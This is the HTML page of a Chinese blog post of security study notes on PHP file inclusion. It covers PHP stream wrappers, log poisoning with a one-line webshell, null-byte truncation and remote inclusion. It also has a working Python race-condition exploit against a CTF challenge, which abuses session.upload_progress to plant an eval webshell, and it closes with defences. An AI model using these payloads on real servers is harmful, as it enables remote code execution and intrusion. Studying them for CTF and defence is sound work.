@@ -1,0 +1,573 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="UTF-8" />
+        <title>文件包含总结 | 遗世独立の幻想乡</title>
+        <meta name="author" content="CloudFlowing" />
+        <meta name="description" content="" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://cdn.staticfile.org/highlight.js/11.7.0/highlight.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://cdn.staticfile.org/highlight.js/11.7.0/styles/github.min.css"
+/>
+<script src="/blog/js/lib/highlight.js"></script>
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+
+        <!-- 页面点击小红心 -->
+        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
+        <!-- 浏览器搞笑标题 -->
+        <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <div id="layout">
+            <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+            </transition>
+            <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>遗世独立の幻想乡</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;遗世独立の幻想乡</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>文件包含总结</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/3/15
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                学习笔记
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/web/" style="color: #ff7d73">web</a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/111713495">文件包含</a></h2><span id="more"></span>
+
+<hr>
+<h3 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h3><h4 id="PHP相关函数"><a href="#PHP相关函数" class="headerlink" title="PHP相关函数"></a>PHP相关函数</h4><p><code>include()</code>:包含一个文件，如错误则抛出警告</p>
+<p><code>include_once()</code>:包含一个文件仅一次，和上面类似</p>
+<p><code>require()</code>:包含一个文件，如错误则报错并停止脚本</p>
+<p><code>require_once()</code>:包含一个文件仅一次，和上面类似</p>
+<p>注：<strong>任何类型</strong>的文件，只要其中含有合法PHP代码，PHP就可以包含并执行；如果没有，就会以纯文本形式显示文件中的内容</p>
+<hr>
+<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000018991087">php伪协议</a></h4><p><strong>php.ini配置文件参数：</strong></p>
+<p><code>allow_url_fopen：on </code>#默认开启 ，表示允许url里的封装协议访问文件；</p>
+<p><code>allow_url_include：off</code> #默认关闭，表示不允许包含url里的封装协议包含文件；</p>
+<h5 id="php-x2F-x2F-协议"><a href="#php-x2F-x2F-协议" class="headerlink" title="php:&#x2F;&#x2F;协议"></a>php:&#x2F;&#x2F;协议</h5><ul>
+<li><p><strong>条件</strong>：</p>
+<p><code>allow_url_fopen</code>:off&#x2F;on</p>
+<p><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp </code>需要on</p>
+</li>
+<li><p><strong>php:&#x2F;&#x2F;filter</strong></p>
+<blockquote>
+<p><strong>读取文件源码</strong>可以直接用resource读取(常用)</p>
+</blockquote>
+<pre><code class="php">//原型
+php://filter/resource=flag.php
+
+//base64编码
+php://filter/read=convert.base64-encode/resource=flag.php
+//quoted-printable编码
+php://filter/read=convert.quoted-printable-encode/resource=flag.php
+//rot13变换
+php://filter/read=string.rot13/resource=flag.php
+
+//字符编码
+php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
+//解码脚本
+&lt;?php
+$str = &quot;lfga= \&quot; lfgaL&#123;xx&#125;x;\&quot;&quot;;
+echo iconv(&#39;UCS-2BE&#39;, &#39;UCS-2LE&#39;, $str);
+?&gt;
+</code></pre>
+<p>写入文件源码需把read改为write，encode改为decode</p>
+</li>
+</ul>
+<p>​    </p>
+<ul>
+<li><p><strong>php:&#x2F;&#x2F;input</strong></p>
+<blockquote>
+<p>执行php代码</p>
+<p>是个可以访问请求的原始数据的只读流。（php:&#x2F;&#x2F;input可以读取没有处理过的<strong>POST数据</strong>）</p>
+</blockquote>
+<p>在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</p>
+<ul>
+<li>利用条件：<code>绕过file_get_contents()</code></li>
+</ul>
+</li>
+</ul>
+<h5 id="data-x2F-x2F-协议"><a href="#data-x2F-x2F-协议" class="headerlink" title="data:&#x2F;&#x2F;协议"></a>data:&#x2F;&#x2F;协议</h5><blockquote>
+<p>访问数据流，执行相应php代码</p>
+</blockquote>
+<p> 可用于flag被过滤的文件包含</p>
+<pre><code class="php">data://text/plain(;base64),编码后的php代码 
+</code></pre>
+<p>​    </p>
+<h5 id="file-x2F-x2F-协议"><a href="#file-x2F-x2F-协议" class="headerlink" title="file:&#x2F;&#x2F;协议"></a>file:&#x2F;&#x2F;协议</h5><blockquote>
+<p><strong>可读取本地文件</strong></p>
+</blockquote>
+<p><strong>条件：</strong></p>
+<ul>
+<li><code>allow_url_fopen</code>:off&#x2F;on</li>
+<li><code>allow_url_include</code> :off&#x2F;on</li>
+</ul>
+<pre><code class="php">file://[文件的绝对路径和文件名]
+http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt
+
+file://[文件的相对路径和文件名]
+http://127.0.0.1/include.php?file=./phpinfo.txt
+
+http://[网络路径和文件名]
+http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt
+</code></pre>
+<h5 id="zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议"><a href="#zip-x2F-x2F-amp-bzip2-x2F-x2F-amp-zlib-x2F-x2F-协议" class="headerlink" title="zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;协议"></a>zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F;协议</h5><blockquote>
+<p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等</p>
+</blockquote>
+<p><strong>条件：</strong></p>
+<ul>
+<li><code>allow_url_fopen</code>:off&#x2F;on</li>
+<li><code>allow_url_include</code> :off&#x2F;on</li>
+</ul>
+<pre><code class="php">zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]
+http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt
+压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传
+
+compress.bzip2://file.bz2
+http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2
+压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）
+
+compress.zlib://file.gz
+http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz
+压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）
+</code></pre>
+<hr>
+<h4 id="Apache日志文件"><a href="#Apache日志文件" class="headerlink" title="Apache日志文件"></a>Apache日志文件</h4><ul>
+<li><p><strong>access.log</strong></p>
+<p>记录网站的访问信息</p>
+<p><code>客户端IP - - [访问时间] &quot;请求记录&quot; HTTP状态码 字节数</code></p>
+</li>
+<li><p><strong>error.log</strong></p>
+<p>记录错误的访问信息</p>
+</li>
+</ul>
+<blockquote>
+<p>注：每次的日志会记录，所以，上传命令之后，如果产生报错或者不执行的情况必须重启容器。  </p>
+<p>再就是可能会有人问为什么发送第二次包的时候才会出现flag。这是因为发送第一个包的时候，将一句话木马写入access.log日志</p>
+<p>第二次发包才包含到前一次的日志中的木马。</p>
+</blockquote>
+<hr>
+<h4 id="nginx日志文件"><a href="#nginx日志文件" class="headerlink" title="nginx日志文件"></a>nginx日志文件</h4><ul>
+<li>位置：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</li>
+</ul>
+<hr>
+<h3 id="本地文件包含漏洞（LFI）"><a href="#本地文件包含漏洞（LFI）" class="headerlink" title="本地文件包含漏洞（LFI）"></a>本地文件包含漏洞（LFI）</h3><p><code>url+参数=挂马文件地址</code></p>
+<h4 id="Apache日志包含漏洞-目录穿越"><a href="#Apache日志包含漏洞-目录穿越" class="headerlink" title="Apache日志包含漏洞+目录穿越"></a>Apache日志包含漏洞+目录穿越</h4><ul>
+<li><p>使用BurpSuite发送请求，在UA头写入一句话木马</p>
+<p>然后就可以include到当前php文件中，实现命令执行，把PHP一句话写进access.log里</p>
+</li>
+<li><p><code>../</code>返回上级目录，可以读取上级目录的access.log文件</p>
+</li>
+</ul>
+<blockquote>
+<p>注：如果不知道日志文件的地址，可以把参数设置成一个不存在的文件名，比如<code>?jumpTo=114514</code>，这样网页会报错显示网站的绝对路径  （如果没有屏蔽报错），使用了各种面板的会显示面板的错误信息，可以以此来判断日志路径。</p>
+</blockquote>
+<hr>
+<h4 id="截断攻击"><a href="#截断攻击" class="headerlink" title="截断攻击"></a>截断攻击</h4><blockquote>
+<p>PHP &lt; 5.3.4</p>
+</blockquote>
+<ul>
+<li>场景：对传入的参数使用字符串拼接</li>
+<li>在ASCII字符集中，<code>%00</code>代表的是<strong>字符串的结束</strong>，也就是说，如果在一串字符的中间插入<code>%00</code>，那么后面的字符串会被丢弃。如果把参数值改为<code>shell.jpg%00</code>，那么之后拼接的字符串将被<code>include</code>方法所丢弃。这样就能成功访问一句话木马。</li>
+</ul>
+<hr>
+<h3 id="远程文件包含漏洞（RFI）"><a href="#远程文件包含漏洞（RFI）" class="headerlink" title="远程文件包含漏洞（RFI）"></a>远程文件包含漏洞（RFI）</h3><p>本质是使用<strong>PHP伪协议</strong>进行包含</p>
+<ul>
+<li><p>无限制：参数之后加上危险脚本的URL</p>
+</li>
+<li><p>有限制时截断：</p>
+<ul>
+<li>使用<code>?</code>绕过，<strong>问号之后的字符串会被当做查询参数丢弃</strong></li>
+<li>使用<code>%20</code>绕过</li>
+</ul>
+</li>
+<li><p>伪协议php:&#x2F;&#x2F;input控制输出流：（BurpSuite）</p>
+<pre><code class="php+HTML">GET /file_include/index.php?jumpTo=php://input HTTP/1.1
+Host: 127.0.0.1
+......
+Sec-Fetch-User: ?1
+
+&lt;?php system(&quot;ipconfig/all&quot;); ?&gt;
+</code></pre>
+<p>此时把显示主机IP地址信息的命令“输入”到了PHP中</p>
+</li>
+</ul>
+<hr>
+<h3 id="日志文件include"><a href="#日志文件include" class="headerlink" title="日志文件include"></a>日志文件include</h3><p>原理：对网站进行访问时,日志文件会记录相关信息(请求头中的信息)</p>
+<p>前提：知道日志文件所在,并能进行包含</p>
+<ul>
+<li>先访问网站在请求头中写入一句话(一般写在user-agent中)</li>
+<li>然后通过post去尝试执行</li>
+<li>执行成功后通过蚁剑连接得到shell</li>
+</ul>
+<hr>
+<h3 id="Session文件包含"><a href="#Session文件包含" class="headerlink" title="Session文件包含"></a>Session文件包含</h3><blockquote>
+<p>php中唯一能无后缀控制</p>
+<p>通过向session传入恶意代码并访问其文件实现</p>
+</blockquote>
+<h4 id="session工作原理"><a href="#session工作原理" class="headerlink" title="session工作原理"></a>session工作原理</h4><p>（1）首先使用<code>session_start()</code>函数进行初始化。</p>
+<p>（2）当执行PHP脚本时，通过使用<strong>SESSION超全局变量</strong>注册session变量。</p>
+<p>（3）当PHP脚本执行结束时，未被销毁的session变量会被自动保存在本地一定路径下的session库中，这个路径可以通过php.ini文件中的session.savepath指定，下次浏览网页时可以加载使用。</p>
+<ul>
+<li><p><strong>session_start()</strong></p>
+<p>（1）读取名为<strong>PHPSESSID</strong>（如果没有改变默认值）的cookie值，假使为abc123。</p>
+<p>（2）若读取到PHPSESSID这个COOKIE，创建SESSION变量，并从相应的目录中（可以在php.ini中设置）读取SESSabc123（默认是这种命名方式）文件，将字符装在入SESSION变量中；</p>
+<p>（3）若没有读取到PHPSESSID这个COOKIE，也会创建SESSION超全局变量注册session变量。同时创建一个sess_abc321(名称为随机值)的session文件，同时将abc321作为PHPSESSID的cookie值返回给浏览器端。</p>
+</li>
+<li><p><strong>利用</strong></p>
+<p><code>$_SESSION[&quot;username&quot;]=参数</code></p>
+<p>当Session文件的内容可控，并且可以获取Session文件的路径，就可以通过包含Session文件进行攻击。</p>
+<ul>
+<li>Session的存储位置获取：</li>
+</ul>
+<p>​	（1）通过phpinfo的信息可以获取到Session的存储位置。phpinfo中的<strong>session.save_path</strong>存储的是Session的存放位置。通过phpinfo的信息获取到session.save_path为<code>/var/lib/php/session</code>。</p>
+<p>​	（2）通过猜测默认的Session存放位置进行尝试。通常Linux下Session默认存储在<code>/var/lib/php/session</code>目录下。默认存储Session存放位置。</p>
+</li>
+</ul>
+<h4 id="关键：session-upload-progress"><a href="#关键：session-upload-progress" class="headerlink" title="关键：session.upload_progress"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38154820/article/details/120300273?ops_request_misc=&request_id=&biz_id=102&utm_term=session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-120300273.nonecase&spm=1018.2226.3001.4187">关键：session.upload_progress</a></h4><blockquote>
+<p>Session Support :enable</p>
+<p>当我们将<code>session.upload_progress.enabled</code>的值设置为<strong>on</strong>时，此时我们再往服务器中上传一个文件时，PHP会把该文件的详细信息(如上传时间、上传进度等)存储在session当中。</p>
+</blockquote>
+<ul>
+<li><p><strong>session.auto_start</strong>：如果 <code>session.auto_start=On </code>，则PHP在接收请求的时候会自动初始化 Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。</p>
+<p>但session还有一个默认选项，<code>session.use_strict_mode</code>默认值为 off。此时用户是可以自己定义 Session ID 的。</p>
+<p>比如，我们在 Cookie 里设置 PHPSESSID&#x3D;a ，PHP 将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_a”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的 session.upload_progress.name 值组成，最后被写入 sess_ 文件里。</p>
+</li>
+<li><p><strong>session.save_path</strong>：负责 session 文件的存放位置，后面文件包含的时候需要知道恶意文件的位置，如果没有配置则不会生成session文件</p>
+</li>
+<li><p><strong>session.upload_progress_enabled</strong>：当这个配置为 On 时，代表 <strong>session.upload_progress 功能开启</strong>，如果这个选项关闭，则这个方法用不了</p>
+</li>
+<li><p><strong>session.upload_progress_cleanup</strong>：这个选项默认也是 On，也就是说<strong>当文件上传结束时，session 文件中有关上传进度的信息立马就会被删除掉</strong>；这里就给我们的操作造成了很大的困难，我们就只能使用<strong>条件竞争</strong>的方式不停的发包，争取在它被删除掉之前就成功利用</p>
+</li>
+<li><p><strong>session.upload_progress_name</strong>：session中的键值，当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控</p>
+</li>
+<li><p><strong>session.upload_progress_prefix</strong>：可以设置上传文件内容的前缀，与session.upload_progress_name 将表示为 session 中的键名</p>
+</li>
+</ul>
+<h4 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h4><blockquote>
+<p>by <a target="_blank" rel="noopener" href="https://ph0ebus.github.io/post/[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%202021]EasyCleanup">ph0ebus</a></p>
+</blockquote>
+<ul>
+<li><p>目标环境开启了<code>session.upload_progress.enable</code>选项</p>
+</li>
+<li><p>发送一个文件上传请求，其中包含一个文件表单和一个名字是PHP_SESSION_UPLOAD_PROGRESS的字段</p>
+</li>
+<li><p>请求的Cookie中包含Session ID</p>
+</li>
+<li><p>注意的是，如果我们只上传一个文件，这里也是不会遗留下Session文件的，所以表单里必须有两个以上的文件上传。</p>
+</li>
+</ul>
+<p>exp:</p>
+<pre><code class="python">import requests
+import io
+import threading
+
+url = &#39;http://6f7113f0-473f-406d-90a6-0cdbbdfacb48.challenge.ctf.show/&#39;    # 改成自己的url
+sessionid = &#39;truthahn&#39;      # 设置PHPSESSID为truthahn，使生成的临时文件名为sess_truthahn
+cookies = &#123;
+            &#39;PHPSESSID&#39;:sessionid
+        &#125;
+
+def write(session):		# write()函数用于写入session临时文件
+    fileBytes = io.BytesIO(b&#39;a&#39;*1024*50)    # 设置上传文件的大小为50k
+    data2 = &#123;
+        &#39;PHP_SESSION_UPLOAD_PROGRESS&#39;:&#39;&lt;?=eval($_POST[1])?&gt;&#39;    # 设置sess_truthahn临时文件的内容为&lt;?=eval($_POST[1])?&gt; 实现一句话
+    &#125;
+    files = &#123;
+        &#39;file&#39;:(&#39;truthahn.jpg&#39;,fileBytes)
+    &#125;
+    while True:    
+        res = session.post(url,data=data2,cookies=cookies,files=files)
+        # print(res.text)
+        #print(&#39;======= write done! ======&#39;)
+
+def read(session): 		# read()函数利用session临时文件生成一句话木马，实现rce
+    data1 = &#123;
+        &quot;1&quot;:&quot;file_put_contents(&#39;/var/www/html/3.php&#39;,&#39;&lt;?=eval($_POST[2]);?&gt;&#39;);&quot;     # 使用file_put_contents()php内置函数生成名为3.php的shell文件
+    &#125;
+    while True:
+        res = session.post(url+&#39;?file=/tmp/sess_&#39;+sessionid,data=data1,cookies=cookies)
+        # print(res.text)
+        res2 = session.get(url+&#39;3.php&#39;)
+        # print(res2.text)
+        if res2.status_code == 200:     #若3.php成功生成，则返回Done!，否则返回失败的状态码
+            print(&#39;++++++++ Done! +++++++++&#39;)
+        else:
+            print(res2.status_code)
+
+if __name__ == &#39;__main__&#39;:
+
+    event = threading.Event()       
+    with requests.session() as session:     # 为每个函数设置5个线程并发执行
+        for i in range(5):
+            #print(&#39;*&#39;*50)
+            threading.Thread(target=write,args=(session,)).start()
+        for i in range(5):
+            #print(&#39;=&#39;*50)
+            threading.Thread(target=read,args=(session,)).start()
+
+    event.set()
+</code></pre>
+<hr>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li><p><strong>调整php.ini中的不合理配置</strong></p>
+<ul>
+<li><strong>magic_quotes_gpc&#x3D;On</strong>，将参数中的异常字符进行转义。</li>
+<li><strong>allow_url_include&#x3D;Off</strong>，禁止将URL作为文件打开处理。</li>
+<li><strong>allow_url_fopen&#x3D;Off</strong>，禁止<code>include()</code>和<code>require()</code>打开URL作为文件处理</li>
+</ul>
+</li>
+<li><p><strong>过滤异常字符</strong></p>
+<p>检查参数，如果参数中含有<code>%</code>，<code>#</code>，<code>;</code>等不需要的字符，将其去掉或者拒绝请求</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuyt2008/article/details/8282310"><strong>更改Apache日志路径</strong></a></p>
+</li>
+<li><p><strong>写死包含的路径或文件名</strong></p>
+<pre><code class="php+HTML">&lt;?php
+    header(&quot;Content-type:text/html;charset=utf-8&quot;);
+    error_reporting(E_ERROR); 
+    ini_set(&quot;display_errors&quot;,&quot;Off&quot;);
+    $link=$_GET[&#39;jumpTo&#39;];
+    if (isset($link)) &#123;
+        switch ($link) &#123;
+            case &#39;job&#39;:
+                include(&#39;./jobs.php&#39;);
+                break;
+            case &#39;hobby&#39;:
+                include(&#39;./hobby.php&#39;);
+                break;
+            default:
+                die(&quot;风雪的缩影，如琉璃般飘落......&quot;);
+                break;
+        &#125;
+    &#125; else &#123;
+        // Do nothing.    
+    &#125;
+?&gt;
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;王小美の主页&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1 style=&quot;text-align: center;&quot;&gt;个人主页&lt;/h1&gt;
+    &lt;br&gt;
+    &lt;img src=&quot;./img/ganyu.png&quot;&gt;
+    &lt;br&gt;
+    &lt;p&gt;Name: 甘雨&lt;/p&gt;&lt;br&gt;
+    &lt;p&gt;Age: 3000+&lt;/p&gt;&lt;br&gt;
+    &lt;p&gt;我是女生&lt;/p&gt;&lt;br&gt;
+    &lt;a href=&quot;./index.php?jumpTo=job&quot;&gt;我的工作&lt;/a&gt;&amp;nbsp;&amp;nbsp;&lt;a href=&quot;./index.php?jumpTo=hobby&quot;&gt;我的兴趣爱好&lt;/a&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+</li>
+</ul>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 遗世独立の幻想乡
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;CloudFlowing
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
